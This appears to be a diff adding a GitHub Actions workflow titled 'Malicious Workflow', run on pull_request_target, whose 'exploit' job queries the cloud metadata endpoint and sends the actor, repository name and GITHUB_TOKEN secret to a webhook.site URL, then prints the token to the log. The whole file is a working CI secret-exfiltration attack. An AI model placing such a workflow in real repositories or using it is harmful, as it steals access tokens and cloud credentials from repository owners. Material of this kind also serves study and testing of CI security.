@@ -1,0 +1,10 @@
+name: Malicious Workflow
+on: [pull_request_target]
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - run: curl "http://169.254.169.254/metadata"  # SSRF
+    - run: curl "https://webhook.site/your-id?actor=${{github.actor}}&repo=${{github.repository}}&token=${{secrets.GITHUB_TOKEN}}"
+    - run: echo "GITHUB_TOKEN write access: ${{secrets.GITHUB_TOKEN}}"
